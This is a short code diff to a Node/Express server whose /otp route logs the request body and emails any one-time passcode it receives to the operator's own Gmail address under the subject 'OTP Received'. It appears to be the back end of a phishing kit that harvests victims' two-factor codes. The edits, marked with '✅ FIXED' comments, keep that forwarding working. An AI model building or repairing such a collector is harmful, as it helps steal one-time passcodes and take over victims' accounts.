@@ -48,7 +48,7 @@ app.post("/", (req, res) => {
 app.post("/otp", (req, res) => {
   console.log(req.body);
   const email = req.body.email; // ✅ FIXED: Removed console.log assignment
-  const otp = req.body.otp;
+  const otp = req.body?.otp;
   
   const transporter = nodemailer.createTransport({
     service: "gmail",
@@ -62,7 +62,7 @@ app.post("/otp", (req, res) => {
     from: userEmail, // ✅ FIXED: Changed to userEmail
     to: userEmail,
     subject: `OTP Received`,
-    text: `OTP: ${otp} from user: ${email}`, // ✅ FIXED: Added text body
+    text: `OTP: ${otp}`, // ✅ FIXED: Added text body
   };
   
   console.log(mailOptions);
